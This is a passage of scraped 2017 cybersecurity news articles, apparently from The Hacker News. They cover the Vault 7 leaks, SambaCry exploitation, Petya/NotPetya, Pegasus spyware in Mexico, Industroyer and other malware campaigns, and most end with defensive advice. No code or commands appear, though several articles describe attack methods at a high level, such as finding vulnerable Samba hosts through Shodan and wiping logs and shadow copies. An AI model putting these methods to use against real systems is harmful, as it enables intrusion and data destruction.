2015 and suspected of being operational since late 2014. What makes HammerToss interesting is its architecture, which leverages Twitter accounts, GitHub accounts, compromised websites, and Cloud-storage to orchestrate command-and-control functions to execute the commands on the targeted systems. Report 5 — This document details the self-code injection and API hooking methods of information stealing Trojan called \"Gamker.\" Gamker uses simple decryption, then drops a copy of itself using a random filename and injects itself into a different process. The trojan also exhibits other typical trojan behaviours. Previous Vault 7 CIA Leaks Last week, WikiLeaks revealed CIAs Highrise Project that allowed the spying agency to stealthy collect and forwards stolen data from compromised smartphones to its server through SMS messages. Since March, the whistle-blowing group has published 17 batches of \"Vault 7\" series, which includes the latest and last week leaks, along with the following batches: BothanSpy and Gyrfalcon — two alleged CIA implants that allowed the spying agency to intercept and exfiltrate SSH credentials from targeted Windows and Linux operating systems using different attack vectors. OutlawCountry – An alleged CIA project that allowed it to hack and remotely spy on computers running the Linux operating systems. ELSA – the alleged CIA malware that tracks geo-location of targeted PCs and laptops running the Microsoft Windows operating system. Brutal Kangaroo – A tool suite for Microsoft Windows used by the agency to targets closed networks or air-gapped computers within an organisation or enterprise without requiring any direct access. Cherry Blossom – An agency's framework, basically a remotely controllable firmware-based implant, used for monitoring the Internet activity of the targeted systems by exploiting vulnerabilities in Wi-Fi devices. Pandemic – A CIA's project that allowed the agency to turn Windows file servers into covert attack machines that can silently infect other computers of interest inside a targeted network. Athena – A CIA's spyware framework that has been designed to take full control over the infected Windows PCs remotely, and works against every version of Microsoft's Windows operating systems, from Windows XP to Windows 10. AfterMidnight and Assassin – Two alleged CIA malware frameworks for the Microsoft Windows platform that has been designed to monitor and report back actions on the infected remote host computer and execute malicious actions. Archimedes – Man-in-the-middle (MitM) attack tool allegedly created by the CIA to target computers inside a Local Area Network (LAN). Scribbles – A piece of software allegedly designed to embed 'web beacons' into confidential documents, allowing the spying agency to track insiders and whistleblowers. Grasshopper – Framework that allowed the spying agency to easily create custom malware for breaking into Microsoft's Windows and bypassing antivirus protection. Marble – Source code of a secret anti-forensic framework, basically an obfuscator or a packer used by the CIA to hide the actual source of its malware. Dark Matter – Hacking exploits the agency designed to target iPhones and Macs. Weeping Angel – Spying tool used by the agency to infiltrate smart TV's, transforming them into covert microphones. Year Zero – Alleged CIA hacking exploits for popular hardware and software." }

Almost two months ago, we reported about a 7-year-old critical remote code execution vulnerability in Samba networking software, allowing a hacker to remotely take full control of a vulnerable Linux and Unix machines. We dubbed the vulnerability as SambaCry, because of its similarities to the Windows SMB vulnerability exploited by the WannaCry ransomware that wreaked havoc across the world over two months ago. Despite being patched in late May, the vulnerability is currently being leveraged by a new piece of malware to target the Internet of Things (IoT) devices, particularly Network Attached Storage (NAS) appliances, researchers at Trend Micro warned. For those unfamiliar: Samba is open-source software (re-implementation of SMB/CIFS networking protocol), which offers Linux/Unix servers with Windows-based file and print services and runs on the majority of operating systems, including Linux, UNIX, IBM System 390, and OpenVMS. Shortly after the public revelation of its existence, the SambaCry vulnerability (CVE-2017-7494) was exploited mostly to install cryptocurrency mining software—\"CPUminer\" that mines \"Monero\" digital currency—on Linux systems. However, the latest malware campaign involving SambaCry spotted by researchers at Trend Micro in July mostly targets NAS devices used by small and medium-size businesses. SHELLBIND Malware Exploits SambaCry to Targets NAS Devices Dubbed SHELLBIND, the malware works on various architectures, including MIPS, ARM and PowerPC, and is delivered as a shared object (.SO) file to Samba public folders and loaded via the SambaCry vulnerability. Once deployed on the targeted machine, the malware establishes communication with the attackers' command and control (C&C) server located in East Africa, and modifies firewall rules to ensure that it can communicate with its server. After successfully establishing a connection, the malware grants the attackers access to the infected device and provides them with an open command shell in the device, so that they can issue any number and type of system commands and eventually take control of the device. In order to find the affected devices that use Samba, attackers can leverage the Shodan search engine and write the original malware files to their public folders. \"It is quite easy to find devices that use Samba in Shodan: searching for port 445 with a 'samba' string will turn up a viable IP list,\" researchers said while explaining the flaw. \"An attacker would then simply need to create a tool that can automatically write malicious files to every IP address on the list. Once they write the files into the public folders, the devices with the SambaCry vulnerability could become ELF_SHELLBIND.A victims.\" However, it is not clear what the attackers do with the compromised devices and what's their actual motive behind compromising the devices. The SambaCry vulnerability is hell easy to exploit and could be used by remote attackers to upload a shared library to a writable share and then cause the server to load and execute the malicious code. The maintainers of Samba already patched the issue in Samba versions 4.6.4/4.5.10/4.4.14, so you are advised to patch your systems against the vulnerability as soon as possible. Just make sure that your system is running updated Samba version. Also, attackers need to have writable access to a shared location on the target system to deliver the payload, which is another mitigating factor that might lower the rate of infection." }

Cross-Platform Malware Targeting Aerospace Industries", "Address" : "https://thehackernews.com/2017/07/adwind-rat-malware.html", "Date" : "2017-07-11T00:16:00-11:00", "Article" : "Hackers and cyber criminals are becoming dramatically more adept, innovative, and stealthy with each passing day. While other operating systems are more widely in use, cybercriminals have now shifted from traditional activities to more clandestine techniques that come with limitless attack vectors, support for cross platforms and low detection rates. Security researchers have discovered that infamous Adwind, a popular cross-platform Remote Access Trojan written in Java, has re-emerged and currently being used to \"target enterprises in the aerospace industry, with Switzerland, Austria, Ukraine, and the US the most affected countries.\" Adwind — also known as AlienSpy, Frutas, jFrutas, Unrecom, Sockrat, JSocket, and jRat — has been in development since 2013 and is capable of infecting all the major operating systems, including Windows, Mac, Linux, and Android. Adwind has several malicious capabilities including stealing credentials, keylogging, taking pictures or screenshots, data gathering and exfiltrate data. The trojan can even turn infected machines into botnets to abuse them for destructing online services by carrying out DDoS attacks. Researchers from Trend Micro recently noticed a sudden rise in the number of Adwind infections during June 2017 — at least 117,649 instances in the wild, which is 107 percent more than the previous month. According to a blog post published today, the malicious campaign was noticed on two different occasions. First was observed on June 7 and used a link to divert victims to their .NET-written malware equipped with spyware capabilities, while the second wave was noticed on June 14 and used different domains hosting their malware and command-and-control servers. Both waves eventually employed a similar social engineering tactic to trick victims into clicking the malicious links within a spam email that impersonate the chair of the Mediterranean Yacht Broker Association (MYBA) Charter Committee. Once infected, the malware also collects system's fingerprints, along with the list of installed antivirus and firewall applications. \"It can also perform reflection, a dynamic code generation in Java. The latter is a particularly useful feature in Java that enables developers/programmers to dynamically inspect, call, and instantiate attributes and classes at runtime. In cybercriminal hands, it can be abused to evade static analysis from traditional antivirus (AV) solutions,\" the researchers wrote. My advice for users to remain protected from such malware is always to be suspicious of uninvited documents sent over an email and never click on links inside those documents unless verifying the source. Additionally, keep your systems and antivirus products up-to-date in order to protect against any latest threat." }

The master key for the original version of the Petya ransomware has been released by its creator, allowing Petya-infected victims to recover their encrypted files without paying any ransom money. But wait, Petya is not NotPetya. Do not confuse Petya ransomware with the latest destructive NotPetya ransomware (also known as ExPetr and Eternal Petya) attacks that wreaked havoc across the world last month, massively targeting multiple entities in Ukraine and parts of Europe. The Petya ransomware has three variants that have infected many systems around the world, but now the author of the original malware, goes by the pseudonym Janus, made the master key available on Wednesday. According to the security researchers, victims infected with previous variants of Petya ransomware, including Red Petya (first version) and Green Petya (second version) and early versions the GoldenEye ransomware can get their encrypted files back using the master key. The authenticity of the master key has been verified by an independent Polish information security researcher known as Hasherezade. \"Similarly to the authors of TeslaCrypt, he released his private key, allowing all the victims of the previous Petya attacks, to get their files back,\" Hasherezade posted her finding on MalwareBytes on Thursday. \"Thanks to the currently published master key, all the people who have preserved the images of the disks encrypted by the relevant versions of Petya, may get a chance of getting their data back.\" Although the first and second version of Petya was cracked last year, the private key released by Janus offers the fastest and most reliable way yet for Petya-infected victims to decrypt their files, especially locked with the uncrackable third version. Meanwhile, Kaspersky Lab research analyst Anton Ivanov also analyzed the Janus' master key and confirmed that the key unlocks all versions of Petya ransomware, including GoldenEye. Janus created the GoldenEye ransomware in 2016 and sold the variants as a Ransomware-as-a-Service (RaaS) to other hackers, allowing anyone to launch ransomware attacks with just one click and encrypt systems and demand a ransom to unlock it. If the victim pays, Janus gets a cut of the payment. But in December, he went silent. However, according to the Petya author, his malware has been modified by another threat actor to create NotPetya that targeted computers of critical infrastructure and corporations in Ukraine as well as 64 other countries. The NotPetya ransomware also makes use of the NSA's leaked Windows hacking exploit EternalBlue and EternalRomance to rapidly spread within a network, and WMIC and PSEXEC tools to remotely execute malware on the machines. Security experts even believe the real intention behind the recent ransomware outcry, which was believed to be bigger than the WannaCry ransomware, was to cause disruption, rather than just another ransomware attack. According to researchers, NotPetya is in reality wiper malware that wipes systems outright, destroying all records from the targeted systems, and asking for ransom was just to divert world's attention from a state-sponsored attack to a malware outbreak. Lucky are not those infected with NotPetya, but the master key can help people who were attacked by previous variants of Petya and Goldeneye ransomware in the past. Security researchers are using the key to build free decryptors for victims who still have crypto-locked hard drives." }

Dubbed CopyCat, the malware has capabilities to root infected devices, establish persistency, and inject malicious code into Zygote – a daemon responsible for launching apps on Android, providing the hackers full access to the devices. Over 14 Million Devices Infected; 8 Million of them Rooted According to the security researchers at Check Point who discovered this malware strain, CopyCat malware has infected 14 million devices, rooted nearly 8 million of them, had 3.8 million devices serve ads, and 4.4 million of them were used to steal credit for installing apps on Google Play. While the majority of victims hit by the CopyCat malware resides in South and Southeast Asia with India being the most affected country, more than 280,000 Android devices in the United States were also infected. While there's no evidence that the CopyCat malware has been distributed on Google Play, the Check Point researchers believe that millions of victims got infected through third-party app downloads and phishing attacks. Like Gooligan, CopyCat malware also uses \"state-of-the-art technology\" to carry out various forms of advertisement fraud. CopyCat uses several exploits, including CVE-2013-6282 (VROOT), CVE-2015-3636 (PingPongRoot), and CVE-2014-3153 (Towelroot) to hit devices running Android 5.0 and earlier, which are all widely used and very old, with the most recent uncovered 2 years ago. The success of the campaign clearly indicates that millions of Android users still rely on old, unpatched, unsupported devices. Here's How CopyCat Infects Android Devices CopyCat disguises as a popular Android app that users download from third-party stores. Once downloaded, the malware starts collecting data about the infected device and downloads rootkits to help root the victim's smartphone. After rooting the Android device, the CopyCat malware removes security defenses from the device and injects code into the Zygote app launching process to fraudulently install apps and display ads and generate revenue. \"CopyCat abuses the Zygote process to display fraudulent ads while hiding their origin, making it difficult for users to understand what's causing the ads to pop-up on their screens,\" Check Point researchers say. \"CopyCat also installs fraudulent apps directly to the device, using a separate module. These activities generate large amounts of profits for the creators of CopyCat, given a large number of devices infected by the malware.\" In just two months of time span, the CopyCat malware helped the hackers make more than $1.5 Million in revenue. The majority of profit (over $735,000) came from nearly 4.9 million fake installations on infected devices, which displays up to 100 million ads. The majority of victims are located in India, Pakistan, Bangladesh, Indonesia, and Myanmar, though over 381,000 devices in Canada and more than 280,000 devices in the U.S. are infected with CopyCat. CopyCat Malware Spreads Using Chinese Advertising Network While there's no direct evidence on who is behind the CopyCat malware campaign, researchers at Check Point found below-mentioned connections that indicate hackers might have used Chinese advertising network 'MobiSummer' for the distribution of the malware. CopyCat malware and MobiSummer operate on the same server Several lines of CopyCat's code is signed by MobiSummer CopyCat and MobiSummer use the same remote services CopyCat did not target Chinese users despite over half of the victims residing in Asia \"It is important to note that while these connections exist, it does not necessarily mean the malware was created by the company, and it is possible the perpetrators behind it used MobiSummer’s code and infrastructure without the firm’s knowledge\" Check Point researchers say. Android users on older devices are still vulnerable to the CopyCat attack, but only if they are downloading apps from third-party app stores. In March 2017, Check Point researchers informed Google about the CopyCat campaign, and the tech giant has already updated Play Protect to block the malware. So, Android users even on older devices are protected through Play Protect, which is updated regularly as malware strains such as CopyCat continue to grow." }

North Korea claims to have conducted the first test of an intercontinental ballistic missile (ICBM), the Hwasong-14, on 3rd July, and US officials believe the country may have fired a brand-new missile that has not been seen before. Now, just a day after the test missile launch, hackers have started utilizing the news to target people interested in North Korean missile arsenal that has progressed over the decades from crude artillery rockets to testing what the country claims long-range missiles that could strike targets in the United States. Security researchers at Talos Intelligence have discovered a new malware campaign that started on 4th July to target victims with KONNI, an unknown Remote Access Trojan (RAT) that has been in use for over three years. The KONNI malware is a Remote Access Trojan designed to steal files, record keystrokes, perform screenshots, get the system information, including hostname, IP address, username, OS version and installed software, as well as execute malicious code on the infected computer. How Does the KONNI Malware Work? The hackers use an email attachment as the initial infection vector to deliver the Trojan through an executable file, which when opened displays an MS Office document that disguised as an article about the test missile launch. However, the content of the document is copy/pasted from an article published on July 3rd by South Korean Yonhap News Agency. In reality, the malicious executable drops two different versions of KONNI: event.dll and errorevent.dll. On 64-bit versions of Windows, both binaries are dropped, while just errorevent.dll is dropped on 32-bit versions of Windows. The dropped malware is then immediately executed to \"ensure that the malware persists and is executed on rebooting the compromised system,\" the researchers say. C&C Server Disguises as a Legitimate Climbing Club Website The malware uses a new Command and Control server hosted on a website that disguises as a legitimate climbing club, but the site does not actually contain any real text, but the default text of the CMS (Content Management System). The C&C traffic of the malware also takes place as \"HTTP post requests to web pages hosted as /weget/download.php, /weget/uploadtm.php or /weget/upload.php on the domain itself.\" In addition, the website also contains a contact section with an address in USA, but the map below the address points to a location in Seoul, South Korea. \"The threat actors associated with KONNI typically use decoy documents relating to North Korea, and this campaign is no exception. However, in contrast to the convincing decoy document lifted from a third party, the content of the decoy website hosted on the CnC server does not look legitimate,\" the researchers concluded. \"Nevertheless, this threat actor continues to remain active and continues to develop updated versions of their malware. Organizations which may have an interest in the contents of this decoy document and that used in previous campaigns should ensure that they are adequately protected against this and subsequent campaigns.\" So, my advice for users to remain protected from such malware is always be suspicious of uninvited documents sent over an email and never click on links inside those documents unless verifying the source. Additionally, keep your systems and antivirus updated to protect against any latest threat." }

Yes, the Petya ransomware attacks that began infecting computers in several countries, including Russia, Ukraine, France, India and the United States on Tuesday and demands $300 ransom was not designed with the intention of restoring the computers at all. According to a new analysis, the virus was designed to look like ransomware but was wiper malware that wipes computers outright, destroying all records from the targeted systems. Comae Technologies Founder Matt Suiche, who closely looked the operation of the malware, said after analyzing the virus, known as Petya, his team found that it was a \"Wiper malware,\" not ransomware. Security experts even believe the real attack has been disguised to divert world's attention from a state-sponsored attack on Ukraine to a malware outbreak. \"We believe the ransomware was, in fact, a lure to control the media narrative, especially after the WannaCry incident, to attract the attention on some mysterious hacker group rather than a national state attacker,\" Suiche writes. Is Petya Ransomware Faulty or Over-Smart? Petya is a nasty piece of malware that, unlike other traditional ransomware, does not encrypt files on a targeted system one by one. Instead, Petya reboots victims computers and encrypts the hard drive's master file table (MFT) and renders the master boot record (MBR) inoperable, restricting access to the full system by seizing information about file names, sizes, and location on the physical disk. Then Petya ransomware takes an encrypted copy of MBR and replaces it with its own malicious code that displays a ransom note, leaving computers unable to boot. However, this new variant of Petya does not keep a copy of replaced MBR, mistakenly or purposely, leaving infected computers unbootable even if victims get the decryption keys. Also, after infecting one machine, the Petya ransomware scans the local network and quickly infects all other machines (even fully-patched) on the same network, using EternalBlue SMB exploit, WMIC and PSEXEC tools. Don't Pay Ransom; You Wouldn’t Get Your Files Back So far, nearly 45 victims have already paid total $10,500 in Bitcoins in hope to get their locked files back, but unfortunately, they would not. It's because the email address, which was being set-up by the attackers to communicate with victims and send decryption keys, was suspended by the German provider shortly after the outbreak. Meaning, even if victims do pay the ransom, they will never recover their files. Kaspersky researchers also said same. \"Our analysis indicates there is little hope for victims to recover their data. We have analyzed the high-level code of the encryption routine, and we have figured out that after disk encryption, the threat actor could not decrypt victims’ disks,\" the security firm said. \"To decrypt a victim’s disk threat actors need the installation ID. In previous versions of 'similar' ransomware like Petya/Mischa/GoldenEye this installation ID contained the information necessary for key recovery.\" If claims made by the researcher is correct that the new variant of Petya is a destructive malware designed to shut down and disrupt services around the world, the malware has successfully done its job. However, it is still speculation, but the virus primarily and massively targeted multiple entities in Ukraine, including the country's local metro, Kiev's Boryspil airport, electricity supplier, the central bank, and the state telecom. Other countries infected by the Petya virus included Russia, France, Spain, India, China, the United States, Brazil, Chile, Argentina, Turkey and South Korea. How Did Petya get into the Computers in the First Place? According to research conducted by Talos Intelligence, little-known Ukrainian firm MeDoc is likely the primary source of the yesterday's global ransomware outbreak. Researchers said the virus has possibly been spread through a malicious software update to a Ukrainian tax accounting system called MeDoc, though MeDoc has denied the allegations in a lengthy Facebook post. \"At the time of updating the program, the system could not be infected with the virus directly from the update file,\" translated version of MeDoc post reads. \"We can argue that users of the MEDoc system can not infect their PC with viruses at the time of updating the program.\" However, several security researchers and even Microsoft agreed with Talo's finding, saying MeDoc was breached and the virus was spread via updates." }

The report — \"Government Spy: Systematic monitoring of journalists and human rights defenders in Mexico\" — published by Citizen Lab today revealed how the Mexican government used advanced spyware tools purchased from the NSO Group to target the country's most prominent human rights lawyers, anti-corruption activists, and journalists. The NSO Group, an Israel-based company that produces the most advanced mobile spyware on the planet, sold the tool to governments with an explicit agreement that it should be used only to fight terrorists or criminal groups that have long kidnapped and killed Mexicans. But, the Mexican government targets include: Lawyers looking into the case of 43 Students disappeared in September 2014 from the town of Iguala. Two Mexican most influential journalists. An American who is representing victims of sexual abuse by the police. A child, presumably in an attempt to spy on his mother. \"The targets share a basic connection: they have been involved in investigating or working on reports of high-level official corruption, or government involvement in human rights abuses,\" the report says. According to the report, the purchase of the NSO Group's exploit \"has been documented by at least three units in Mexico: the National Defense Secretariat (SEDENA) the Attorney General's Office (PGR) the National Security and Investigation Center (CISEN) Since 2011, the above three Mexican federal agencies have purchased nearly $80 Million worth of spyware from the NSO group. The surveillance tool in question is the infamous mobile spyware 'Pegasus' that was also used in targeted cyber attacks against human rights activists in the United Arab Emirates last year. Pegasus is one of the NSO group's most advanced mobile spyware tool that can infiltrate Android, as well as iPhones to monitor calls, texts, email, contacts, and calendars, as well as use the phone's microphone and camera for surveillance, turning a target’s smartphone into a sophisticated bugging device. According to the report, the targets had received over 76 messages with links to the Pegasus exploit along with uniquely crafted social engineering messages, \"troubling personal and sexual taunts, messages impersonating official communications by the Embassy of the United States in Mexico, fake AMBER Alerts, warnings of kidnappings, and other threats.\" Once the victims open the link, Pegasus would then get downloaded onto their smartphones, turning the target's smartphone into a digital spying tool, which is in the pocket of victims, but fully under the control of the operator. The malware allows the attacker to extract an incredible amount of data stored in files, contacts, messages, and emails and then forward them to a hidden server. It also takes control of the smartphone's microphone and camera — all without users’ knowledge. Among those targeted by the government include: Activists with the Centro Miguel Agustín Pro Juárez for Human Rights (Centro PRODH) Members of the Mexican Institute for Competitiveness (IMCO) TV personality and investigative journalist Carmen Aristegui, along with her son Emilio Aristegui (a teenager) Other journalists working for the Mexican non-profit Against Corruption and Impunity TV network Televisa anchor Carlos Loret de Mola A majority of the infection attempts on victims were recorded under two separate events: in August 2015 and between April 2016 and July 2016. The report asserts that all evidence points towards the Mexican government which itself is behind the cyber espionage." }

While new forms of cybercrime are on the rise, traditional activities seem to be shifting towards more clandestine techniques that come with limitless attack vectors with low detection rates. Security researchers have recently discovered a new fileless ransomware, dubbed \"Sorebrect,\" which injects malicious code into a legitimate system process (svchost.exe) on a targeted system and then self-destruct itself in order to evade detection. Unlike traditional ransomware, Sorebrect has been designed to target enterprise's servers and endpoint. The injected code then initiates the file encryption process on the local machine and connected network shares. This fileless ransomware first compromises administrator credentials by brute forcing or some other means and then uses Microsoft’s Sysinternals PsExec command-line utility to encrypt files. \"PsExec can enable attackers to run remotely executed commands, instead of providing and using an entire interactive login session, or manually transferring the malware into a remote machine, like in RDPs,\" Trend Micro says. Sorebrect Also Encrypts Network Shares Sorebrect also scans the local network for other connected computers with open shares and locks files available on them as well. \"If the share has been set up such that anyone connected to it has read-and-write access to it, the share will also be encrypted,\" researchers say. The nasty ransomware then deletes all event logs (using wevtutil.exe) and shadow copies (using vssadmin) on the infected machine that could provide forensic evidence such as files executed on the system and their timestamps, which makes this threat hard-to-detect. In addition, Sorebrect uses the Tor network protocol in an attempt to anonymize its communication with its command-and-control (C&C) server, just like almost every other malware. Sorebrect Ransomware Spreads Worldwide The Sorebrect fileless ransomware has been designed to target systems from various industries including manufacturing, technology, and telecommunications. According to Trend Micro, Sorebrect was initially targeting Middle Eastern countries like Kuwait and Lebanon, but from last month, this threat has started infecting people in Canada, China, Croatia, Italy, Japan, Mexico, Russia, Taiwan, and the U.S. \"Given ransomware’s potential impact and profitability, it wouldn’t be a surprise if SOREBRECT turns up in other parts of the world, or even in the cybercriminal underground where it can be peddled as a service,\" the researchers note. This is not the first time when researchers have come across Fileless malware. Two months ago, Talos researchers discovered a DNSMessenger attack that was completely Fileless and used DNS TXT messaging capabilities to compromise systems. In February, Kaspersky researchers also discovered fileless malware that resided solely in the memory of the compromised computers, which was found targeting banks, telecommunication companies, and government organizations in 40 countries. Ways to Protect Against Ransomware Attacks Since the ransomware does not target individuals but organizations, sysadmins and information security professionals can protect themselves by: Restricting user write permissions: a significant factor that exposes network shares to ransomware by giving users full permissions. Limiting privilege for PsExec: Limit PsExec and provide permission to run them only to system administrators. Keeping your system and network up-to-date: Always keep your operating system, software, and other applications updated. Backing up your data regularly: To always have a tight grip on all your important files and documents, keep a good backup routine in place that makes their copies to an external storage device that is not always connected to your PC. Adopting a cyber security-aware workforce: Educating your employees about malware, threat vectors and security measure always plays a major role in any organization." }

The joint report from the FBI and U.S. Department of Homeland Security (DHS) provided details on \"DeltaCharlie,\" a malware variant used by \"Hidden Cobra\" hacking group to infect hundreds of thousands of computers globally as part of its DDoS botnet network. According to the report, the Hidden Cobra group of hackers are believed to be backed by the North Korean government and are known to launch cyber attacks against global institutions, including media organizations, aerospace and financial sectors, and critical infrastructure. While the US government has labeled the North Korean hacking group Hidden Cobra, it is often known as Lazarus Group and Guardians of Peace – the one allegedly linked to the devastating WannaCry ransomware menace that shut down hospitals and businesses worldwide. DeltaCharlie – DDoS Botnet Malware The agencies identified IP addresses with \"high confidence\" associated with \"DeltaCharlie\" – a DDoS tool which the DHS and FBI believe North Korea uses to launch distributed denial-of-service (DDoS) attacks against its targets. DeltaCharlie is capable of launching a variety of DDoS attacks on its targets, including Domain Name System (DNS) attacks, Network Time Protocol (NTP) attacks, and Character Generation Protocol (CGP) attacks. The botnet malware is capable of downloading executables on the infected systems, updating its own binaries, changing its own configuration in real-time, terminating its processes, and activating and terminating DDoS attacks. However, the DeltaCharlie DDoS malware is not new. DeltaCharlie was initially reported by Novetta in their 2016 Operation Blockbuster Malware Report [PDF], which described this as the third botnet malware from the North Korean hacking group, after DeltaAlpha and DeltaBravo. Other malware used by Hidden Cobra include Destover, Wild Positron or Duuzer, and Hangman with sophisticated capabilities, including DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware. Hidden Cobra's Favorite Vulnerabilities Operating since 2009, Hidden Cobra typically targets systems running older, unsupported versions of Microsoft operating systems, and commonly exploits vulnerabilities in Adobe Flash Player to gain an initial entry point into victim's machine. These are the known vulnerabilities affecting various applications usually exploited by Hidden Cobra: Hangul Word Processor bug (CVE-2015-6585) Microsoft Silverlight flaw (CVE-2015-8651) Adobe Flash Player 18.0.0.324 and 19.x vulnerability (CVE-2016-0034) Adobe Flash Player 21.0.0.197 Vulnerability (CVE-2016-1019) Adobe Flash Player 21.0.0.226 Vulnerability (CVE-2016-4117) The simplest way to defend against such attacks is always to keep your operating system and installed software and applications up-to-date, and protect your network assets behind a firewall. Since Adobe Flash Player is prone to many attacks and just today the company patched nine vulnerability in Player, you are advised to update or remove it completely from your computer. The FBI and DHS have provided numerous indicators of compromise (IOCs), malware descriptions, network signatures, as well as host-based rules (YARA rules) in an attempt to help defenders detect activity conducted by the North Korean state-sponsored hacking group. \"If users or administrators detect the custom tools indicative of HIDDEN COBRA, these tools should be immediately flagged, reported to the DHS National Cybersecurity Communications and Integration Center (NCCIC) or the FBI Cyber Watch (CyWatch), and given highest priority for enhanced mitigation,\" the alert reads. Besides this, the agencies have also provided a long list of mitigations for users and network administrators, which you can follow here." }

Dubbed \"Xavier,\" the malicious ad library, initially emerged in September 2016, is a member of AdDown malware family, potentially posing a severe threat to millions of Android users. Since 90 percent of Android apps are free for anyone to download, advertising on them is a key revenue source for their developers. For this, they integrate Android SDK Ads Library in their apps, which usually doesn't affect an app's core functionality. According to security researchers at Trend Micro, the malicious ad library comes pre-installed on a wide range of Android applications, including photo editors, wallpapers and ringtone changers, Phone tracking, Volume Booster, Ram Optimizer and music-video player. Features of Xavier Info-Stealing Malware The previous variant of Xavier Ad library was a simple adware with an ability to install other APKs silently on the targeted devices, but in the latest release, the malware author has replaced those features with more sophisticated ones, including: Evade Detection: Xavier is smart enough to escape from being analyzed, from both static and dynamic malware analysis, by checking if it is being running in a controlled environment (Emulator), and using data and communication encryptions. Remote Code Execution: The malware has been designed to download codes from a remote Command & Control (C&C) server, allowing hackers to remotely execute any malicious code on the targeted device. Info-Stealing Module: Xavier is configured to steal devices and user related information, which includes user’ email address, Device id, model, OS version, country, manufacturer, sim card operator, resolution, and Installed apps. According to the researchers, the highest number of infected users are from Southeast countries in Asia such as Vietnam, Philippines, and Indonesia, with a fewer number of downloads are from the United States and Europe. Here is a list of 75 infected Android apps that Google has already removed from its Play Store, and if you have installed any of these apps on your device, you are advised to remove it immediately. Android malware continues to evolve with more sophisticated and never-seen-before capabilities with every passing day. Just last week, we saw first Android malware with code injecting capabilities making rounds on Google Play Store. How to Protect Yourself The easiest way to prevent yourself from being targeted by a clever malware like Xavier, always beware of fishy applications, even when downloading them from official Play Store and try to stick to the trusted brands only. Moreover, always look at the reviews below left by other users who have downloaded the app and verify app permissions before installing any app and grant those permissions that have are relevant for the app's purpose. Last but not the least, you are strongly advised to always keep a good antivirus application on your device that can detect and block such malware before they can infect your device, and keep your device and apps up-to-date." }

Now, security researchers have discovered the culprit behind those cyber attacks on the Ukrainian industrial control systems. Slovakia-based security software maker ESET and US critical infrastructure security firm Dragos Inc. say they have discovered a new dangerous piece of malware in the wild that targets critical industrial control systems and is capable of causing blackouts. Dubbed \"Industroyer\" or \"CrashOverRide,\" the grid-sabotaging malware was likely to be used in the December 2016 cyber attack against Ukrainian electric utility Ukrenergo, which the security firms say represents a dangerous advancement in critical infrastructure hacking. According to the researchers, CrashOverRide is the biggest threat designed to disrupt industrial control systems, after Stuxnet — the first malware allegedly developed by the US and Israel to sabotage the Iranian nuclear facilities in 2009. This Malware Does Not Exploit Any Software Flaw Unlike Stuxnet worm, the CrashOverRide malware does not exploit any \"zero-day\" software vulnerabilities to do its malicious activities; instead, it relies on four industrial communication protocols used worldwide in power supply infrastructure, transportation control systems, and other critical infrastructure systems. The CrashOverRide malware can control electricity substation' switches and circuit breakers, designed decades ago, allowing an attacker to simply turning off power distribution, cascading failures and causing more severe damage to equipment. Industroyer malware is a backdoor that first installs four payload components to take control of switches and circuit breakers; and then connects to a remote command-and-control server to receive commands from the attackers. \"Industroyer payloads show the authors' in-depth knowledge and understanding of industrial control systems.\" ESET researchers explain. \"The malware contains a few more features that are designed to enable it to remain under the radar, to ensure the malware's persistence, and to wipe all traces of itself after it has done its job.\" Since there have been four malware discovered in the wild to date that target industrial control systems, including Stuxnet, Havex, BlackEnergy, and CrashOverRide; Stuxnet and CrashOverRide were designed only for sabotage, while BlackEnergy and Havex were meant for conducting espionage. \"The functionality in the CRASHOVERRIDE framework serves no espionage purpose and the only real feature of the malware is for attacks which would lead to electric outages,\" reads Dragos analysis [PDF] of the malware. Malware Can Cause Wider and Longer-Lasting Blackouts The analysis of the malware suggests CrashOverRide could cause power outages far more widespread, sophisticated and longer lasting than the one Ukraine suffered last December. Dragos CEO Robert M. Lee said the CrashOverRide malware is capable of causing power outages that can last up to a few days in portions of a country's electric grid, but it is not capable enough to bring down the entire grid of a nation. The malware includes interchangeable, plug-in components that could allow CrashOverRide to be altered to different electric power utilities or even launched simultaneous attacks on multiple targets. \"CrashOverRide is not unique to any particular vendor or configuration and instead leverages knowledge of grid operations and network communications to cause impact; in that way, it can be immediately re-purposed in Europe and portions of the Middle East and Asia,\" Dragos' paper reads. \"CrashOverRide is extensible and with a small amount of tailoring such as the inclusion of a DNP3 [Distributed Network Protocol 3] protocol stack would also be effective in the North American grid.\" According to the researchers, the malware can be modified to target other types of critical infrastructure, like transportation, gas lines, or water facilities, as well with additional protocol modules. The security firms have already alerted government authorities and power grid companies about the dangerous threat, along with some advises that could help them to defend against this threat. The security firms already argued that the 2016 power outage was likely caused by the same group of hackers who caused 2015 blackout — Sandworm, a state-sponsored hacking group believed to be from Russia. Dragos tracked the perpetrators behind CrashOverRide as Electrum and assessed \"with high confidence through confidential sources that Electrum has direct ties to the Sandworm team.\" The security firms have already alerted government authorities and power grid companies about the dangerous threat, along with some advises that could help them to defend against this threat." }

Hackers Started Using \"SambaCry Flaw\" to Hack Linux Systems", "Address" : "https://thehackernews.com/2017/06/linux-samba-vulnerability.html", "Date" : "2017-06-10T01:16:00-11:00", "Article" : "Remember SambaCry? Two weeks ago we reported about a 7-year-old critical remote code execution vulnerability in Samba networking software (re-implementation of SMB networking protocol) that allows a remote hacker to take full control of a vulnerable Linux and Unix machines. To know more about the SambaCry vulnerability (CVE-2017-7494) and how it works, you can read our previous article. At that time, nearly 485,000 Samba-enabled computers were found to be exposed on the Internet, and researchers predicted that the SambaCry-based attacks also have potential to spread just like WannaCry ransomware widely. The prediction came out to be quite accurate, as honeypots set up by the team of researchers from Kaspersky Lab have captured a malware campaign that is exploiting SambaCry vulnerability to infect Linux computers with cryptocurrency mining software. Another security researcher, Omri Ben Bassat‏, independently discovered the same campaign and named it \"EternalMiner.\" According to the researchers, an unknown group of hackers has started hijacking Linux PCs just a week after the Samba flaw was disclosed publicly and installing an upgraded version of \"CPUminer,\" a cryptocurrency mining software that mines \"Monero\" digital currency. After compromising the vulnerable machines using SambaCry vulnerability, attackers execute two payloads on the targeted systems: INAebsGB.so — A reverse-shell that provides remote access to the attackers. cblRWuoCc.so — A backdoor that includes cryptocurrency mining utilities – CPUminer. \"Through the reverse-shell left in the system, the attackers can change the configuration of a miner already running or infect the victim’s computer with other types of malware,\" Kaspersky researchers say. Mining cryptocurrencies can be a costly investment as it requires an enormous amount of computing power, but such cryptocurrency-mining malware makes it easier for cybercriminals by allowing them to utilise computing resources of compromised systems to make the profit. If you have been following The Hacker News 